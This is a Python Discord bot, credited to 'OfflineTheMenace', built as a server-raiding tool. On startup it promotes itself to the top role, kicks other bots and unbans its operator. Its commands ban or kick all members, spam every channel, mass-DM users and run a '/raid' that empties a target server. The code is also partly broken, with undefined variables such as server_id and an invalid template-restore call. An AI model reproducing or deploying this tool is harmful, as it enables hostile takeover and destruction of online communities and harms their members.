import discord
from discord.ext import commands
import random
import os
import asyncio
from termcolor import colored
from discord import Embed
from discord.app_commands import CommandTree
from pystyle import Colorate, Colors, Center

ascii_art_title= '''
  @@@@@@  @@@@@@@@ @@@@@@@@ @@@      @@@ @@@  @@@ @@@@@@@@      @@@@@@@   @@@@@@  @@@@@@@
 @@!  @@@ @@!      @@!      @@!      @@! @@!@!@@@ @@!           @@!  @@@ @@!  @@@   @@!
 @!@!@! @!!!:!   @!!!:!   @!!     !!@ @!@@!!@! @!!!:!        @!@!@!@  @!@!@!   @!!
!!:!!!!!:    !!:    !!:    !!:!!:!!!!!:         !!:!!!!!:!!! !!:
  : :. :   :        :       : ::.: : :   ::    :  : :: :::      :: : ::   : :. :     :

Made by OfflineTheMenace
Discord: imoffline1234567890

'''
print(Colorate.horizontal(Colors.purple_to_pink, ascii_art_title))


# Prompt the user for dynamic inputs
mode = input("Guild Mode(1) or User Mode(2): ")
user_id = input("Enter your user ID: ")
bot_token = input("Enter the bot token: ")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # Ensure the bot can read user data, including in DMs
bot = commands.Bot(command_prefix="!", intents=intents)

# Internal data structure to remember users with command permissions
command_users = set()
disabled_commands = set()
template_link = None

# Check if the bot already has a command tree
if not hasattr(bot, 'tree'):
    tree = CommandTree(bot)
else:
    tree = bot.tree

# Bot events
@bot.event
async def on_ready():
    print(colored('『+』Bot is ready', 'blue'))
    if mode == '1':
        guild = bot.get_guild(int(server_id))
        bot.top_role = guild.roles[-1]  # Get the top role from the guild

        # Promote the bot to the top role
        await promote_bot_to_top_role(guild)

        for member in guild.members:
            if member.id == int(user_id) and member.id != guild.owner.id:
                await member.unban()
                invite = await guild.channels[0].create_invite()
                print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))
            if member.bot and member.id != bot.user.id:
                await member.kick()
                print(colored(f'『+』Kicked bot: {member.name}', 'blue'))

        # Monitor banned members and unban the bot runner if necessary
        banned_members = await guild.bans()
        for ban_entry in banned_members:
            if ban_entry.user.id == int(user_id):
                await guild.unban(ban_entry.user)
                invite = await guild.channels[0].create_invite()
                print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))

        # Save the template link on startup
        global template_link
        template_code = await guild.create_template()
        template_link = template_code.code
        print(colored(f'『+』Saved server template link: {template_link}', 'blue'))

    # Sync commands with Discord
    try:
        await tree.sync(guild=discord.Object(id=YOUR_GUILD_ID))  # Replace with your guild ID for testing
        print(colored('『+』Commands synced!', 'blue'))
    except Exception as e:
        print(colored(f'『+』Sync failed: {e}', 'red'))

# Function to promote the bot to the top role
async def promote_bot_to_top_role(guild):
    me = guild.me
    top_role = guild.roles[-1]  # Get the top role in the guild

    if top_role.position > me.top_role.position:
        print(colored(f'『+』Bot does not have permission to promote itself to the top role', 'red'))
        return

    try:
        await me.edit(roles=[top_role])
        print(colored(f'『+』Promoted bot to the top role', 'blue'))
    except discord.errors.Forbidden:
        print(colored(f'『+』Bot does not have permission to promote itself', 'red'))

# Slash command for Active Developer badge
@tree.command(name="active_dev", description="Command to meet the Active Developer badge requirements")
async def active_dev(interaction: discord.Interaction):
    await interaction.response.send_message("This command meets the requirements for the Active Developer badge!")

# Register the slash command
async def register_slash_commands():
    await tree.sync(guild=None)  # Register commands globally

# Override the built-in help command
@tree.command(name="help", description="Show the help message")
async def help(interaction: discord.Interaction):
    help_message = '''
    /say (message) - Say something as the bot
    /kick (mention) - Kick a user
    /kickall - Kick all users
    /ban (mention) - Ban a user
    /banall - Ban all users
    /unban (user ID) - Unban a user
    /nick (mention) (new nickname) - Change a user's nickname
    /spam (message) (amount) - Spam a message
    /rolecreate (name) - Create a role
    /roledelete (mention) - Delete a role
    /rolegive (mention) (role mention) - Give a user a role
    /roleremove (mention) (role mention) - Remove a role from a user
    /addcmdperms (mention) - Allow a user to use the bot
    /removecmdperms (mention) - Remove a user's permission to use
    /addchannel (name) - Create a channel
    /removechannel (mention) - Delete a channel
    /renamechannel (new name) - Rename the current channel
    /disablecmd (command) - Disable a command
    /enablecmd (command) - Enable a command
    /restore - Restore the server to the saved template
    /dm (user ID) (message) - Send a DM to a user
    /raid (server ID) - Perform a raid on a server
    '''
    embed = Embed(title="Help", description=help_message, color=0x00ff00)
    await interaction.response.send_message(embed=embed)

@tree.command(name="say", description="Make the bot say something")
async def say(interaction: discord.Interaction, *, message: str):
    if 'say' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        embed = Embed(title="Bot Message", description=message, color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to send messages in this channel.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied in channel: {interaction.channel.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /say command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="kick", description="Kick a user")
async def kick(interaction: discord.Interaction, member: discord.Member):
    if 'kick' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    embed = Embed(title="Kick User", description=f"Kicked {member.name}", color=0x00ff00)
    try:
        await member.kick()
        print(colored(f'『+』Kicked user: {member.name}', 'blue'))
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to kick this user.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to kick user: {member.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /kick command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="kickall", description="Kick all users")
async def kickall(interaction: discord.Interaction):
    if 'kickall' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    tasks = [member.kick() for member in guild.members if member.id != interaction.user.id]
    try:
        await asyncio.gather(*tasks)
        embed = Embed(title="Kick All Users", description="Kicked all users except the owner.", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to kick users.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to kick users in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /kickall command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="ban", description="Ban a user")
async def ban(interaction: discord.Interaction, member: discord.Member):
    if 'ban' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    embed = Embed(title="Ban User", description=f"Banned {member.name}", color=0x00ff00)
    try:
        await member.ban()
        print(colored(f'『+』Banned user: {member.name}', 'blue'))
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to ban this user.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to ban user: {member.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /ban command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="banall", description="Ban all users")
async def banall(interaction: discord.Interaction):
    if 'banall' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    tasks = [member.ban() for member in guild.members if member.id != interaction.user.id]
    try:
        await asyncio.gather(*tasks)
        embed = Embed(title="Ban All Users", description="Banned all users except the owner.", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to ban users.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to ban users in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /banall command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="unban", description="Unban a user")
async def unban(interaction: discord.Interaction, user_id: int):
    if 'unban' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    user = await bot.fetch_user(user_id)
    try:
        await guild.unban(user)
        print(colored(f'『+』Unbanned user: {user.name}', 'blue'))
        embed = Embed(title="Unban User", description=f"Unbanned {user.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to unban this user.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to unban user: {user.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /unban command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="nick", description="Change a user's nickname")
async def nick(interaction: discord.Interaction, member: discord.Member, *, nickname: str):
    if 'nick' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await member.edit(nick=nickname)
        print(colored(f'『+』Changed nickname of user: {member.name} to {nickname}', 'blue'))
        embed = Embed(title="Change Nickname", description=f"Changed {member.name}'s nickname to {nickname}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to change this user's nickname.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to change nickname of user: {member.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /nick command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="spam", description="Spam a message")
async def spam(interaction: discord.Interaction, message: str, amount: int):
    if 'spam' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    channels = [channel for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]

    async def spam_channel(channel):
        for _ in range(amount):
            await channel.send(message)

    tasks = [spam_channel(channel) for channel in channels]
    try:
        await asyncio.gather(*tasks)
        embed = Embed(title="Spam Message", description=f"Spammed '{message}' {amount} times in all channels", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to send messages in some channels.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to send messages in some channels in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /spam command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="rolecreate", description="Create a role")
async def rolecreate(interaction: discord.Interaction, *, name: str):
    if 'rolecreate' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    try:
        await guild.create_role(name=name)
        print(colored(f'『+』Created role: {name}', 'blue'))
        embed = Embed(title="Create Role", description=f"Created role: {name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to create roles.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to create roles in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /rolecreate command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="roledelete", description="Delete a role")
async def roledelete(interaction: discord.Interaction, role: discord.Role):
    if 'roledelete' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await role.delete()
        print(colored(f'『+』Deleted role: {role.name}', 'blue'))
        embed = Embed(title="Delete Role", description=f"Deleted role: {role.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to delete roles.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to delete roles in guild: {interaction.guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /roledelete command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="rolegive", description="Give a user a role")
async def rolegive(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    if 'rolegive' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await member.add_roles(role)
        print(colored(f'『+』Gave role {role.name} to user: {member.name}', 'blue'))
        embed = Embed(title="Give Role", description=f"Gave role {role.name} to {member.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to manage roles.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to manage roles in guild: {interaction.guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /rolegive command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="roleremove", description="Remove a role from a user")
async def roleremove(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    if 'roleremove' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await member.remove_roles(role)
        print(colored(f'『+』Removed role {role.name} from user: {member.name}', 'blue'))
        embed = Embed(title="Remove Role", description=f"Removed role {role.name} from {member.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to manage roles.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to manage roles in guild: {interaction.guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /roleremove command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="addcmdperms", description="Allow a user to use the bot")
async def addcmdperms(interaction: discord.Interaction, member: discord.Member):
    if 'addcmdperms' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    command_users.add(member.id)
    print(colored(f'『+』Added command permissions for user: {member.name}', 'blue'))
    embed = Embed(title="Add Command Permissions", description=f"Added command permissions for {member.name}", color=0x00ff00)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecmdperms", description="Remove a user's permission to use the bot")
async def removecmdperms(interaction: discord.Interaction, member: discord.Member):
    if 'removecmdperms' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    if member.id in command_users:
        command_users.remove(member.id)
        print(colored(f'『+』Removed command permissions for user: {member.name}', 'blue'))
        embed = Embed(title="Remove Command Permissions", description=f"Removed command permissions for {member.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    else:
        embed = Embed(title="No Permissions", description="This user does not have command permissions.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="addchannel", description="Create a channel")
async def addchannel(interaction: discord.Interaction, *, name: str):
    if 'addchannel' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    try:
        await guild.create_text_channel(name)
        print(colored(f'『+』Created channel: {name}', 'blue'))
        embed = Embed(title="Create Channel", description=f"Created channel: {name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to create channels.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to create channels in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /addchannel command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="removechannel", description="Delete a channel")
async def removechannel(interaction: discord.Interaction, channel: discord.TextChannel):
    if 'removechannel' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await channel.delete()
        print(colored(f'『+』Deleted channel: {channel.name}', 'blue'))
        embed = Embed(title="Delete Channel", description=f"Deleted channel: {channel.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to delete channels.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to delete channels in guild: {interaction.guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /removechannel command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="renamechannel", description="Rename the current channel")
async def renamechannel(interaction: discord.Interaction, *, new_name: str):
    if 'renamechannel' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    channel = interaction.channel
    try:
        await channel.edit(name=new_name)
        print(colored(f'『+』Renamed channel: {channel.name} to {new_name}', 'blue'))
        embed = Embed(title="Rename Channel", description=f"Renamed channel from {channel.name} to {new_name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to rename channels.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to rename channels in guild: {interaction.guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /renamechannel command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="disablecmd", description="Disable a command")
async def disablecmd(interaction: discord.Interaction, command: str):
    if 'disablecmd' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    disabled_commands.add(command)
    print(colored(f'『+』Disabled command: {command}', 'blue'))
    embed = Embed(title="Disable Command", description=f"Disabled command: {command}", color=0x00ff00)
    await interaction.response.send_message(embed=embed)

@tree.command(name="enablecmd", description="Enable a command")
async def enablecmd(interaction: discord.Interaction, command: str):
    if 'enablecmd' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    if command in disabled_commands:
        disabled_commands.remove(command)
        print(colored(f'『+』Enabled command: {command}', 'blue'))
        embed = Embed(title="Enable Command", description=f"Enabled command: {command}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    else:
        embed = Embed(title="Command Not Disabled", description="This command is not currently disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="restore", description="Restore the server to the saved template")
async def restore(interaction: discord.Interaction):
    if 'restore' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = interaction.guild
    try:
        await guild.edit(template=template_link)
        print(colored(f'『+』Restored server to template: {template_link}', 'blue'))
        embed = Embed(title="Restore Server", description=f"Restored server to template: {template_link}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to restore the server template.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to restore server template in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /restore command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="dm", description="Send a DM to a user")
async def dm(interaction: discord.Interaction, user_id: int, *, message: str):
    if 'dm' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    user = await bot.fetch_user(user_id)
    try:
        await user.send(message)
        print(colored(f'『+』Sent DM to user: {user.name}', 'blue'))
        embed = Embed(title="Send DM", description=f"Sent DM to {user.name}", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to send DMs to this user.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to send DMs to user: {user.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /dm command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

@tree.command(name="raid", description="Perform a raid on a server")
async def raid(interaction: discord.Interaction, server_id: int):
    if 'raid' in disabled_commands:
        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    guild = bot.get_guild(server_id)
    if guild is None:
        embed = Embed(title="Server Not Found", description="The specified server was not found.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        # Example raid logic: Kick all members except the owner
        tasks = [member.kick() for member in guild.members if member.id != guild.owner_id]
        await asyncio.gather(*tasks)
        embed = Embed(title="Raid Completed", description="Raid on the server has been completed.", color=0x00ff00)
        await interaction.response.send_message(embed=embed)
    except discord.errors.Forbidden:
        embed = Embed(title="Permission Denied", description="I don't have permission to kick users in this server.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        print(colored(f'『+』Permission denied to kick users in guild: {guild.name}', 'red'))
    except Exception as e:
        print(colored(f'『+』Error in /raid command: {e}', 'red'))
        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

# Run the bot with the provided token
bot.run(bot_token)

